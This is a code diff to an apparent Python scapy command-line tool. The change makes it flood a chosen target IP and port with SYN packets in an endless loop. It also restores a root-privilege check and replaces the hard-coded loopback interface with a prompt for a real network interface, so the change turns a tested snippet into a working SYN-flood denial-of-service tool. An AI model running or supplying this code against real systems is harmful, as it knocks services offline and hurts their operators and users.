@@ -86,12 +86,11 @@ class CLI(cmd.Cmd):
 	    conf.iface='lo';#network card XD
 
  
-#	    while 1:
-
-	    syner = sendSYN(targetip, port)
-	    syner.start()
-	    total += 1
-	    sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
+	    while 1:
+		syner = sendSYN(targetip, port)
+		syner.start()
+		total += 1
+		sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
 	
 	
     def help_hello(self):
@@ -110,13 +109,14 @@ class CLI(cmd.Cmd):
 
 if __name__ == '__main__':
 
-    #logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
-    #if os.geteuid() != 0:
-    #    sys.exit("[!] Please run as root")
-    
-    total = 0
-    conf.iface='lo';#network card XD
+    if os.geteuid() != 0:
+        sys.exit("[!] Please run as root")
+   
+#    print "Please enter network interface:"
+    conf.iface = raw_input("Enter network interface: ")  
+#    conf.iface='lo';#network card XD
     cli = CLI()
     cli.cmdloop()
 
